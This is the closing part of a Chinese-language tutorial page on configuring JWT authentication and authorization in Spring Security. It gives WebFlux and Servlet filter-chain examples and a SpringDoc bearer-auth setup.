style="color:#393A34"><span class="token plain">            } else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                return Mono.empty();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    };</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    AuthenticationWebFilter filter = new AuthenticationWebFilter(authenticationManager);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    filter.setServerAuthenticationConverter(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        exchange -&gt; {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            String token = exchange.getRequest().getHeaders().getFirst(&quot;Authorization&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if (token != null &amp;&amp; token.startsWith(&quot;Bearer &quot;)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                token = token.substring(7);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                Authentication authentication = jwtUtil.parseToAuthentication(token);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                return Mono.just(authentication);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return Mono.empty();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    );</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    SecurityWebFilterChain chain = http</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .httpBasic(basic -&gt; basic.disable())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .formLogin(form -&gt; form.disable())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .logout(logout -&gt; logout.disable())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .addFilterBefore(filter, SecurityWebFiltersOrder.AUTHENTICATION)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .authorizeExchange(exchanges -&gt; exchanges</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .pathMatchers(&quot;/resource/public&quot;).permitAll()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .pathMatchers(&quot;/resource/private&quot;).authenticated()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .pathMatchers(&quot;/resource/admin&quot;).hasRole(&quot;ADMIN&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .anyExchange().permitAll()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    )</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .csrf(csrf -&gt; csrf.disable())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .cors(Customizer.withDefaults())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .securityContextRepository(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        NoOpServerSecurityContextRepository.getInstance()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    )</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .build();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return chain;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>如果是使用的 Servlet 版本，有一点点不同。具体而言，创建 AuthenticationFilter 时需要一并传入 AuthenticationConverter。在添加 Filter 时要使用类名。</p>
<p>代码如下，</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">@Bean</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public SecurityFilterChain securityFilterChain(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    HttpSecurity http,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @Autowired JwtUtil jwtUtil </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    AuthenticationManager authenticationManager = new AuthenticationManager() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        public Authentication authenticate(Authentication authentication) throws AuthenticationException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if(authentication.isAuthenticated()) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                return authentication;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            } else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                throw new BadCredentialsException(&quot;Bad credentials&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    };</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    AuthenticationConverter converter = new AuthenticationConverter() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        public Authentication convert(HttpServletRequest request) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            String token = request.getHeader(&quot;Authorization&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if (token != null &amp;&amp; token.startsWith(&quot;Bearer &quot;)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                token = token.substring(7);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                Authentication authentication = jwtUtil.parseToAuthentication(token);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                return authentication;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return null;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    };</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    AuthenticationFilter filter = new AuthenticationFilter(authenticationManager, converter);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    SecurityFilterChain chain = http</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .httpBasic(basic -&gt; basic.disable())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .formLogin(form -&gt; form.disable())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .logout(logout -&gt; logout.disable())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .addFilterBefore(filter, UsernamePasswordAuthenticationFilter.class)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .authorizeRequests(authorizeRequests -&gt; authorizeRequests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .antMatchers(&quot;/resource/public&quot;).permitAll()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .antMatchers(&quot;/resource/private&quot;).authenticated()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .antMatchers(&quot;/resource/admin&quot;).hasRole(&quot;ADMIN&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .anyRequest().permitAll()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    )</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .csrf(csrf -&gt; csrf.disable())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .cors(Customizer.withDefaults())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .build();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return chain;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>如果使用了 SpringDoc，把认证模式切换为<code>bearerAuth</code>即可。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">@GetMapping(&quot;/private&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@SecurityRequirement(name = &quot;bearerAuth&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public Mono&lt;String&gt; privateResource() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return Mono.just(&quot;Private resource&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@Configuration</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@SecurityScheme(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    name = &quot;bearerAuth&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    type = SecuritySchemeType.HTTP,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    scheme = &quot;bearer&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">class SpringDocConfig {}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>综上，这样就实现了 JWT 认证与鉴权。通过这个例子，我们也更好地理解了 Spring Security 的认证与鉴权流程。</p>
<p>以及，网上很多教程都是自己写一个 Filter，然后在 Filter 里面写认证逻辑，这样根本就没过 Spring Security 的认证流程，这样做是不对的。本文的写法才是正确的。当然，这个也可能因为 Spring Security 的文档没明确写这点。不过大部分人确实没有自定义验证方法的需求。</p>
<p>Spring Security 内置的 JWT 是基于 OAuth2 认证框架的，比较复杂，在下一部分介绍。</p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/finger-bone/micro-service-crashcourse/blob/main/docs/14.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/micro-service-crashcourse/docs/13"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">WebFlux</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/micro-service-crashcourse/docs/15"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Spring Security OAuth 认证与 KeyCloak</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#spring-security-三大职能" class="table-of-contents__link toc-highlight">Spring Security 三大职能</a></li><li><a href="#攻击防护" class="table-of-contents__link toc-highlight">攻击防护</a><ul><li><a href="#常见的网络安全攻击及其原理" class="table-of-contents__link toc-highlight">常见的网络安全攻击及其原理</a></li><li><a href="#配置-spring-security-进行攻击防护" class="table-of-contents__link toc-highlight">配置 Spring Security 进行攻击防护</a></li></ul></li><li><a href="#单体应用的认证与鉴权" class="table-of-contents__link toc-highlight">单体应用的认证与鉴权</a><ul><li><a href="#认证信息的传递" class="table-of-contents__link toc-highlight">认证信息的传递</a></li><li><a href="#spring-security-认证与鉴权流程" class="table-of-contents__link toc-highlight">Spring Security 认证与鉴权流程</a></li><li><a href="#配置-spring-security-进行-basic-认证与鉴权" class="table-of-contents__link toc-highlight">配置 Spring Security 进行 Basic 认证与鉴权</a></li><li><a href="#配置-spring-security-进行表单认证与鉴权" class="table-of-contents__link toc-highlight">配置 Spring Security 进行表单认证与鉴权</a></li><li><a href="#配置-spring-security-进行-jwt-认证与鉴权" class="table-of-contents__link toc-highlight">配置 Spring Security 进行 JWT 认证与鉴权</a></li></ul></li></ul></div></div></div></div></main></div></div></div></div>
</body>
</html>